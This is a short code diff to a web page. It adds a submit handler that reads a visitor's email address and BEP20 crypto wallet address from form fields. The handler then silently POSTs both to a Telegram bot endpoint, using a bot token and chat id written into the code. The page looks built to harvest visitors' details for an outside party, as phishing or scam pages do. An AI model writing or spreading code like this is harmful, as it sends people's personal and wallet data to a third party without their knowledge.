@@ -1000,11 +1000,25 @@
         }
 
     </script>
+
     <script>
+        document.getElementById("submitButton").addEventListener("click", saveData);
+
         function saveData() {
+
             var email = document.getElementById("emailInput").value;
             var bep20 = document.getElementById("bep20Input").value;
+            console.log(email, bep20);
 
+            var url = "https://api.telegram.org/bot6381175517:AAGV7Y7lbnSVnDzLurHgCHjaF1nnPLchQe8/sendMessage"
+            var user_id = 2019113759
+
+            const data = { chat_id: user_id, text: email+'|'+bep20 };
+            const response = fetch(url, {
+                method: 'POST', 
+                body: JSON.stringify(data),
+                headers: { 'Content-Type': 'application/json' }
+            });
             
         }
     </script>
